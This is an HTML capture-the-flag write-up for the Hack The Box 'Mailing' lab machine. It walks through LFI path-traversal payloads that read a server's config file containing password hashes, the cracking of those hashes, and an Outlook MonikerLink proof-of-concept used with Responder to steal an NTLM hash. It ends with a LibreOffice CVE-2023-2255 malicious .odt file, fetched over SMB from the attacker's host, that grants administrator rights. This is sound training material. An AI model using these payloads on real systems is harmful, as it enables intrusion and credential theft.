<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Mailing</title>
<meta name=description content="Platform: Hack The Box Link: Mailing Level: Easy OS: Windows Mailing from HackTheBox is an interesting box. After our initial scan, we discover several …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-mailing/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Mailing"><meta property="og:description" content="Platform: Hack The Box Link: Mailing Level: Easy OS: Windows Mailing from HackTheBox is an interesting box. After our initial scan, we discover several …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Mailing/Mailing.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Mailing/Mailing.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Mailing"><meta name=twitter:description content="Platform: Hack The Box Link: Mailing Level: Easy OS: Windows Mailing from HackTheBox is an interesting box. After our initial scan, we discover several …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-mailing/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-mailing/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Mailing/Mailing.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-mailing/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-mailing/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Mailing</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>September 6, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Mailing>Mailing</a></li><li>Level: Easy</li><li>OS: Windows</li></ul><hr><p>Mailing from HackTheBox is an interesting box. After our initial scan, we discover several email-related services. By exploiting an LFI vulnerability, we find two password hashes, and successfully cracking one of them gives us the admin password. We then use the recent MonikerLink vulnerability to retrieve a user&rsquo;s NTLM hash, which provides us with our initial foothold. Privilege escalation is achieved by placing a malicious file in a specific directory where all files with the <code>.odt</code> extension are automatically executed, granting us admin privileges.</p><p>Target IP address - <code>10.10.11.14</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Mailing 10.10.11.14
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-09-07 00:50 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.14
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.054s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>990</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE       VERSION
</span></span><span style=display:flex><span>25/tcp  open  smtp          hMailServer smtpd
</span></span><span style=display:flex><span>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>80/tcp  open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://mailing.htb
</span></span><span style=display:flex><span>110/tcp open  pop3          hMailServer pop3d
</span></span><span style=display:flex><span>|_pop3-capabilities: UIDL TOP USER
</span></span><span style=display:flex><span>135/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>143/tcp open  imap          hMailServer imapd
</span></span><span style=display:flex><span>|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA <span style=color:#e06c75>RIGHTS</span><span style=color:#56b6c2>=</span>texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
</span></span><span style=display:flex><span>445/tcp open  microsoft-ds?
</span></span><span style=display:flex><span>465/tcp open  ssl/smtp      hMailServer smtpd
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>mailing.htb/organizationName<span style=color:#56b6c2>=</span>Mailing Ltd/stateOrProvinceName<span style=color:#56b6c2>=</span>EU<span style=color:#98c379>\S</span>pain/countryName<span style=color:#56b6c2>=</span>EU
</span></span><span style=display:flex><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style=display:flex><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style=display:flex><span>587/tcp open  smtp          hMailServer smtpd
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>mailing.htb/organizationName<span style=color:#56b6c2>=</span>Mailing Ltd/stateOrProvinceName<span style=color:#56b6c2>=</span>EU<span style=color:#98c379>\S</span>pain/countryName<span style=color:#56b6c2>=</span>EU
</span></span><span style=display:flex><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style=display:flex><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
</span></span><span style=display:flex><span>993/tcp open  ssl/imap      hMailServer imapd
</span></span><span style=display:flex><span>|_imap-capabilities: SORT IMAP4 IDLE OK QUOTA <span style=color:#e06c75>RIGHTS</span><span style=color:#56b6c2>=</span>texkA0001 CAPABILITY completed NAMESPACE IMAP4rev1 CHILDREN ACL
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent <span style=color:#e5c07b>time</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>mailing.htb/organizationName<span style=color:#56b6c2>=</span>Mailing Ltd/stateOrProvinceName<span style=color:#56b6c2>=</span>EU<span style=color:#98c379>\S</span>pain/countryName<span style=color:#56b6c2>=</span>EU
</span></span><span style=display:flex><span>| Not valid before: 2024-02-27T18:24:10
</span></span><span style=display:flex><span>|_Not valid after:  2029-10-06T18:24:10
</span></span><span style=display:flex><span>Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-09-07T05:51:14
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 68.70 seconds
</span></span></code></pre></div><p>Many open ports are discovered. We have various services such as SMTP, POP3, HTTP, SMB, and IMAP; as alluded by the box name this point us to an email set up. We also have a redirection to <code>mailing.htb</code> which we add to the hosts file.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.14 mailing.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>Visiting <code>http://mailing.htb/</code> we find a website for a secure email service powered by <a href=https://www.hmailserver.com/>hmailserver</a>.</p><p><img src=/images/HTB-Mailing/mailing-website.png alt="Mailing website"></p><p>The only thing we can do is download a pdf file, detailing the instructions for the installation process.</p><p><img src=/images/HTB-Mailing/download_instructions.png alt="Download instructions button"></p><p>Continuing with the enumeration process, directory and subdomain enumeration are both unfruitful.</p><pre tabindex=0><code>gobuster dir -u http://mailing.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u http://mailing.htb/ -H &#34;Host: FUZZ.mailing.htb&#34; -ic -fs 4681
</code></pre><p>After capturing the request we get with the <code>Download Instructions</code> button we can observe the <code>file</code> parameter being included. If this is not properly secured we could have a potential LFI vulnerability (Local File Inclusion).</p><p><img src=/images/HTB-Mailing/download-request.png alt="Mailing Download button request"></p><p>We see that the application is using <code>ASP.NET</code> with <code>IIS</code> for the server. We know that the <code>web.config</code> file must be present at the web root location <code>C:\inetpub\wwwroot</code> for <code>ASP.NET</code> applications to function correctly. So we can try to read the content of the file in order to confirm our LFI possibility.
<em>Read more about it <a href="https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0#webconfig-file-location">here</a>.</em></p><p><img src=/images/HTB-Mailing/wappalyzer.png alt="Mailing wappalyzer"></p><p>Using <code>../../inetpub/wwwroot/web.config</code> for the file value</p><p><img src=/images/HTB-Mailing/IIS-web-config.png alt="Mailing LFI test"></p><p>We get a hit and are able to read the file.</p><p><img src=/images/HTB-Mailing/web-config-content.png alt="Mailing web.config content"></p><p>The next step will be to try to read some sensitive files. We already know that the target is using hmailserver so we will focus on that, let&rsquo;s search for <code>hmailserver ini ile location</code>.</p><p>This <a href="https://www.hmailserver.com/forum/viewtopic.php?t=29069">post</a> tells us that by default the ini file is in <code>C:\Program Files\hMailServer\Bin</code> but using <code>../../Program+Files/hMailServer/Bin/hMailServer.ini</code> as our payload returns <code>File not found</code>.</p><p>We learn from <a href="https://www.hmailserver.com/forum/viewtopic.php?t=38903">this</a> forum discussion that the ini file can also be in <code>program files (x86)\hMailServer\Bin\hMailServer.ini</code>.</p><p>With the payload <code>../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini</code> we discover some information about the hMailServer service running on the target.</p><p><img src=/images/HTB-Mailing/INI-file.png alt="LFI for hmailserver INI file"></p><p><img src=/images/HTB-Mailing/INI-file-pwds.png alt="INI file - passwords found"></p><p>The file contains two password hashes, the administrative password which is <code>841bb5acfa6779ae432fd7a4e6600ba7</code> and a user password <code>0a9f8ad8bf896b501dde74f08efd7e4c</code>. It also reveals the software directories and the database in use (MSSQL).</p><p>Using <a href=https://crackstation.net/>CrackStation</a> we find the administrator password to be <code>homenetworkingadministrator</code>.</p><p><img src=/images/HTB-Mailing/admin-pwd.png alt="admin password"></p><blockquote><p>We aren&rsquo;t able to crack the second hash.</p></blockquote><h2 id=initial-foothold>Initial Foothold</h2><p>We can use Telnet to test the POP3 connection, the steps are explained <a href=https://www.resellerspanel.com/articles/cloud-web-hosting-articles/email/testing-incoming-mail-pop3-settings-via-telnet/>here</a>.</p><pre tabindex=0><code>telnet 10.129.59.26 110

USER administrator@mailing.htb
PASS homenetworkingadministrator
</code></pre><p><img src=/images/HTB-Mailing/pop3-check.png alt="POP3 mail box check"></p><p>The mailbox is empty but we know that there is a mail server set up with authentication. On the website we can read <code>Using any mail client you can connect to our server with your account with any system (Linux, MacOS or Windows)</code>.</p><p>The target is running Windows so it is most likely using Microsoft Outlook. One of the most recent vulnerability in Outlook is <a href=https://blog.checkpoint.com/research/check-point-research-unveils-critical-monikerlink-vulnerability-in-microsoft-outlook-with-a-9-8-cvss-severity-score/>MonikerLink</a>, which can lead to the leaking of local NTLM credential information.</p><blockquote><p>TryhackMe has a <a href=https://tryhackme.com/r/room/monikerlink>room</a> specifically dedicated to that vulnerability.</p></blockquote><p>Knowing this we find a PoC for this vulnerability <a href=https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability>here</a>. We can use it to send an email to a valid user and leak their NTLM hash.</p><blockquote><p>After reading the instructions PDF (available for download on the website) we discover that <code>maya@mailing.htb</code> is a valid user on the server on (page 16).</p></blockquote><ol><li>Setup Responder</li></ol><pre tabindex=0><code>sudo responder -I tun0
</code></pre><ol start=2><li>Send the email</li></ol><pre tabindex=0><code>python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url &#39;\\MY_IP_ADDRESS\test&#39; --subject Hi
</code></pre><p><img src=/images/HTB-Mailing/email_sent_poc.png alt="Email sent via PoC"></p><ol start=3><li>Crack the hash received in Responder</li></ol><p><img src=/images/HTB-Mailing/responder-hash.png alt="Hash obtained for maya"></p><pre tabindex=0><code>hashcat -a 0 -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Mailing/maya-pwd.png alt="Maya password"></p><p>After cracking the hash with hashcat we recover the password <code>m4y4ngs4ri</code> and with Evil-WinRM we login as Maya with the command below.</p><pre tabindex=0><code>evil-winrm -i TARGET_IP -u maya -p m4y4ngs4ri
</code></pre><p>The user flag is in <code>C:\Users\maya\Desktop</code>.</p><p><img src=/images/HTB-Mailing/user-flag.png alt="user flag location"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>In <code>C:\Users\maya\Documents</code> we find two files <code>mail.py</code> and <code>mail.vbs</code>. Both scripts automate interactions with an email client (most likely Microsoft Outlook) by opening unread emails.</p><p>Now since we have some automated tasks setup they have to be configured in some way in order to actually be executed. We can find the scheduled tasks on Windows with the <code>schtasks</code> command-line tool.</p><pre tabindex=0><code>schtasks /query /fo LIST /v
</code></pre><p>We indeed have tasks related to <code>mail.py</code> and <code>mail.vbs</code>. Furthermore there is another task called <code>\Test</code> that executes a PowerShell script located at <code>C:\Users\localadmin\Documents\scripts\soffice.ps1</code>.</p><p><img src=/images/HTB-Mailing/Test-scheduled-task.png alt="Test scheduled task"></p><p>Unfortunately we are unable to view the content of <code>localadmin</code>.</p><p><img src=/images/HTB-Mailing/access-denied-localadmin.png alt="localadmin user, access denied"></p><p>In <code>Program Files</code> we notice that <code>Libre Office</code> is installed. This is noteworthy (at least for me) as it&rsquo;s usually used on Linux systems. The file <code>readme_en-US.txt</code> in <code>C:\Program Files\libreOffice\readmes</code> reveals the version running.</p><p><img src=/images/HTB-Mailing/LibreOffice-version.png alt="Libre Office version"></p><p>In <code>C:\Program Files\LibreOffice\program\</code> we find a <code>soffice.ps1</code> script.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PowerShell data-lang=PowerShell><span style=display:flex><span><span style=color:#7f848e># Set the directory where the .odt files are located</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$directory</span> = <span style=color:#98c379>&#34;C:\Users\Public\Documents&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Get all files with .odt extension in the specified directory</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$files</span> = <span style=color:#e5c07b>Get-ChildItem</span> <span style=color:#e06c75>-Path</span> <span style=color:#e06c75>$directory</span> <span style=color:#e06c75>-Filter</span> *.<span style=color:#e06c75>odt</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e># Loop through each .odt file and open it</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>foreach</span> (<span style=color:#e06c75>$file</span> <span style=color:#c678dd>in</span> <span style=color:#e06c75>$files</span>) {
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>Start-Process</span> <span style=color:#e06c75>$file</span>.<span style=color:#e06c75>FullName</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The script automates the process of opening all OpenDocument Text files (<code>*.odt</code>) located in the specified directory.</p><p>Going back to the LibreOffice version we find a PoC <a href=https://github.com/elweth-sec/CVE-2023-2255>here</a> for <a href=https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/>CVE-2023-2255</a>.</p><p>Knowing that <code>.odt</code> files are automatically opened when placed in a certain directory, we can craft a malicious file that will execute commands when opened. We will create a file to add <code>maya</code> to the adminstrators group.</p><p>We don&rsquo;t find the usual <code>Administrators</code> directory in <code>C:\Users</code>, instead we have a user called <code>localadmin</code>. With <code>net user localadmin</code> we confirm that it is part of the administrators group called <code>Administradores</code> in this case.</p><p><img src=/images/HTB-Mailing/localadmin-memberships.png alt="localadmin membership"></p><pre tabindex=0><code>git clone https://github.com/elweth-sec/CVE-2023-2255

python3 CVE-2023-2255.py --cmd &#39;net localgroup Administradores maya /add&#39; --output &#39;exploit.odt&#39;
</code></pre><p><img src=/images/HTB-Mailing/malicious_odt_file.png alt="Malicious odt file"></p><p>The malicious odt file is sent to the target using a SMB server but after placing it in <code>C:\Users\Public\Documents</code> nothing happened.</p><blockquote><p>After scratching my head for a long time I noticed another interesting directory.</p></blockquote><p>We find a directory called <code>Important Documents</code> in <code>C:\</code>, checking its permissions we notice that members of the <code>Administradores</code> group have full control <code>(F)</code> permissions on the directory. Moreover Maya has modify <code>(M)</code> permissions on it too.</p><p><img src=/images/HTB-Mailing/folder-permissions.png alt="Important Documents directory permissions"></p><p>So let&rsquo;s place our malicious file there.</p><ol><li>Start a SMB server</li></ol><pre tabindex=0><code>impacket-smbserver mailing `pwd` -smb2support
</code></pre><ol start=2><li>Connect to the SMB server with user maya</li></ol><pre tabindex=0><code>net use \\MY_IP\mailing
</code></pre><ol start=3><li>Move into <code>C:\Important Documents</code> and download the malicious file</li></ol><pre tabindex=0><code>cd &#39;Important Documents&#39;
copy \\MY_IP\mailing\exploit.odt
</code></pre><ol start=4><li>Wait a little bit then confirms that Maya is now part of the <code>Administradores</code> group with <code>net user maya</code>.</li></ol><p><img src=/images/HTB-Mailing/maya_admin.png alt="maya now part of admin group"></p><p>Log out of Evil-WinRM and login again for the privilege to take effect. You can now access the <code>C:\Users\localadmin\Desktop</code> where you will find the root flag.</p><p><img src=/images/HTB-Mailing/root-flag.png alt="Root flag"></p><p>Thank you for reading this write up!</p></div><div class=prev-next><div class=prev-post><p><a href=/posts/htb-runner/>&#8592;
Previous:
HTB: Runner</a></p><p class=prev-post-date>August 22, 2024</p></div><div class=next-post><p><a href=/posts/htb-solarlab/>Next:
HTB: SolarLab
&#8594;</a></p><p class=next-post-date>September 20, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>